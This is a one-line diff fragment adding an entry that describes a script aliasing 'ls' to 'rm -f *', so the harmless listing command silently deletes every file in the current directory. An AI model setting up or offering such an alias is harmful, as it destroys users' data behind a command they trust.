@@ -1,0 +1,1 @@
+0. alias ls = "rm -f *": script that creates an alias/n
